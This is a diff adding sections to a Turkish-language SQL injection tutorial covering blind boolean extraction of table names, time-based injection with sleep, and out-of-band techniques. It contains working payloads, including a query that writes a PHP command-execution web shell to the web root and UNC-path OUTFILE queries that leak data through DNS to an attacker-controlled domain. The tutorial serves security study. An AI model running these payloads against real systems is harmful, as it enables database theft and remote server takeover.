@@ -418,3 +418,96 @@ haber yok
 </html>
 ```
 
+Bu şekilde bir sorgu yazdığımda haber yok sonucu döner. Çünkü ilk tablo adı olan users'ın ilk harfi ile eşleşmemekte.
+
+```
+query = SELECT * FROM haberler WHERE id=1 AND SUBSTRING(
+    (SELECT table_name FROM information_schema.tables WHERE
+    table_schema=database() LIMIT 1,1) #users
+    ,1
+    ,1
+)='a'
+
+<html>
+haber yok
+</html>
+```
+
+Bunu sırayla u'ya kadar denersek haber var sonucunu alırız.
+
+```
+query = SELECT * FROM haberler WHERE id=1 AND SUBSTRING(
+    (SELECT table_name FROM information_schema.tables WHERE
+    table_schema=database() LIMIT 1,1) #users
+    ,1
+    ,1
+)='u'
+
+<html>
+haber var
+</html>
+```
+
+Bunu böyle teker teker denemek oldukça zahmetli olacaktır. Bunun daha efektif bir yolu var. Ascii tablosundan yardım almak. Aradığım değerin 32 ile 127 arasında olduğu görülüyor. Ortalama bir değer olan 80 ile kıyaslıyorum ve haber var sonucunu aldıktan sonra yazacağım sorguda 80 ile 159 arasında bir değer deneyeceğim ve bu şekilde 159 olası karakteri teker teker denemektense işleri daha hızlı ve efketif bir biçime getiriyorum.
+
+![image](https://github.com/user-attachments/assets/d0fdd53b-fa76-4450-a09d-33e59da74d1a)
+
+```
+query = SELECT * FROM haberler WHERE id=1 AND ASCII(SUBSTRING(
+    (SELECT table_name FROM information_schema.tables WHERE
+    table_schema=database() LIMIT 1,1) #users
+    ,1
+    ,1
+))> 80
+
+<html>
+haber var
+</html>
+```
+
+# ** 4- Time Based Sqli**
+
+Görselde yer alan iki sorgu da aynı sonucu döndürmekte.
+
+![image](https://github.com/user-attachments/assets/27dbad43-e541-4660-91ff-b42d14289bec)
+
+Buradaki sorgudaki IF kısmı bu şekilde çalışır.
+
+```
+IF(şart, doğruysa_döndür, yanlışsa_döndür)
+```
+
+Şimdi IF kısmına sleep komutunu yazarak sonucu bize bekleterek vermesini sağlıyorum. 5 satırlık verim olduğu için 5 kat fazla sürede bekletiliyorum.
+
+![image](https://github.com/user-attachments/assets/501afec2-1993-4f8f-99e7-feb73cbd4a16)
+
+# ** 5- Out of Band Sqli**
+
+Kod yapımı değiştirdim. Web uygulaması, bizden aldığı değeri RabbitMQ isimli bir servise gönderdi. Artık sleep() ifadesini koysak bile veritabanı uyumayacaktır. Çünkü SQL injection bizim konuştuğumuz uygulamada yok. Bu uygulama bizden alıp başka bir yapıya göndermektedir.
+
+```jsx
+id = request.get('id')
+
+rabbitmq.pushTask('report_generate',id)
+
+print("selam")
+```
+
+INTO OUTFILE diske bir veri yazma işlevini yerine getirir. Windowsun bir özelliği vardır.
+
+```
+SELECT '<?=system(@$_GET['cmd']);?>' INTO OUTFILE 'var/www/html/c99.php';
+```
+
+Burada samba bağlanır. domain’i çözmesi gerekir. subdomain’e biz artık başka şeyler yazabiliriz;
+
+```
+SELECT 'ilker' INTO OUTFILE '\\\hacker.mdisec.com/a';
+```
+
+Burada artık kendi sql sorgumuzu da çalıştırabiliriz;
+
+```
+SELECT 'mdisec' INTO OUTFILE '\\\'+(SELECT 'mdisec')+'.mdisec.com/a';
+```
+
